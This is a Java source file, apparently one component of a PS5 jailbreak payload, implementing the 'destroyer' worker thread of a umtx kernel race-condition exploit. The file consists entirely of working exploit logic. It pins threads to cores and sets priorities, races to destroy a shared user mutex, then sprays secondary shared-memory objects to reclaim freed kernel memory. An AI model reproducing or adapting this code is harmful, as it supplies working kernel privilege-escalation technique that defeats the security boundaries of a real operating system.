package org.ps5jb.client.payloads.umtx.impl1;

import org.ps5jb.client.payloads.umtx.common.DebugStatus;
import org.ps5jb.sdk.core.Pointer;
import org.ps5jb.sdk.core.SdkException;
import org.ps5jb.sdk.include.UniStd;
import org.ps5jb.sdk.include.machine.Param;
import org.ps5jb.sdk.include.sys.CpuSet;
import org.ps5jb.sdk.include.sys.RtPrio;
import org.ps5jb.sdk.include.sys.Umtx;
import org.ps5jb.sdk.include.sys.errno.NotFoundException;

public class DestroyerJob extends CommonJob {
    private final State state;
    private final int index;

    public DestroyerJob(int index, State state) {
        super();

        this.state = state;

        this.index = index;
        this.jobName = "destroyer#" + index;
    }

    protected void prepare() throws SdkException {
        super.prepare();

        // Move destroyer thread to separate core.
        CpuSet cpuSet = new CpuSet(this.libKernel);
        cpuSet.setCurrentThreadAffinity(this.state.DESTROYER_THREAD_CORES[index]);

        if (Config.toggleSetThreadPriorities) {
            // Set destroyer thread's priority, so it will run before lookup thread.
            RtPrio rtprio = new RtPrio(this.libKernel);
            rtprio.setRtPrio(0, Config.DESTROYER_THREAD_PRIORITY);
        }
    }

    protected void work() {
        final Umtx umtx = new Umtx(this.libKernel);
        final UniStd uniStd = new UniStd(this.libKernel);
        while (!this.state.raceDoneFlag.get()) {
            DebugStatus.debug("Starting loop");

            DebugStatus.debug("Waiting for ready flag");
            while (!this.state.readyFlag.get()) {
                thread_yield();
            }

            // Notify main thread that destroyer thread's loop is ready to start.
            this.state.numReadyThreads.incrementAndGet();

            DebugStatus.debug("Waiting for destroy flag");
            while (!this.state.destroyFlag.get()) {
                thread_yield();
            }

            // Trigger destroying of primary user mutex and check for result.
            try {
                umtx.userMutexDestroy(this.state.primarySharedMemoryKeyAddress);

                // Notify that destroy was successful.
                this.state.numDestructions.incrementAndGet();
            } catch (NotFoundException e) {
                // Expected
            } catch (SdkException e) {
                DebugStatus.error("Performing destroy operation failed", e);
            }

            // Notify that destroyer thread done its main job.
            this.state.numCompletedThreads.incrementAndGet();

            DebugStatus.debug("Waiting for spray flag");
            while (!this.state.sprayFlag.get()) {
                thread_yield();
            }

            if (this.state.numDestructions.get() >= Config.MAX_DESTROYER_THREADS && Config.toggleSprayOnDestroyThread) {
                DebugStatus.notice("Spraying and praying");
                for (int i = this.index; i < this.state.reclaimDescriptors.length; i += Config.MAX_DESTROYER_THREADS) {
                    try {
                        Pointer secShm = this.state.secondarySharedMemoryKeyAddress.inc(0x8L * i);

                        if (DebugStatus.isDebugEnabled()) {
                            DebugStatus.debug("Creating secondary user mutex #" + i);
                        }
                        int descriptor = umtx.userMutexCreate(secShm);

                        if (DebugStatus.isDebugEnabled()) {
                            DebugStatus.debug("Descriptor of secondary shared memory object #" + i + ": " + descriptor);
                        }
                        this.state.reclaimDescriptors[i] = descriptor;

                        if (DebugStatus.isDebugEnabled()) {
                            DebugStatus.debug("Truncating secondary shared memory object #" + i);
                        }
                        uniStd.ftruncate(descriptor, Param.ptoa(descriptor));

                        DebugStatus.debug("Destroying secondary user mutex #" + i);
                        umtx.userMutexDestroy(secShm);
                    } catch (SdkException e) {
                        DebugStatus.error("Spray failed at iteration " + i, e);
                    }
                }
                DebugStatus.notice("Spraying done");
            }

            // Notify that destroyer thread done spraying.
            this.state.numSprays.incrementAndGet();

            DebugStatus.debug("Waiting for check done flag");
            while (!this.state.checkDoneFlag.get()) {
                thread_yield();
            }

            // Notify main thread that destroyer thread is ready to finish.
            this.state.numReadyThreads.incrementAndGet();

            DebugStatus.debug("Waiting for done flag");
            while (!this.state.doneFlag.get()) {
                thread_yield();
            }

            // Notify main thread that destroyer thread's loop was finished.
            this.state.numFinishedThreads.incrementAndGet();
        }

        // Racing done, waiting for others.

        DebugStatus.debug("Waiting for destroy flag");
        while (!this.state.destroyFlag.get()) {
            thread_yield();
        }

        DebugStatus.debug("Finishing loop");
    }
}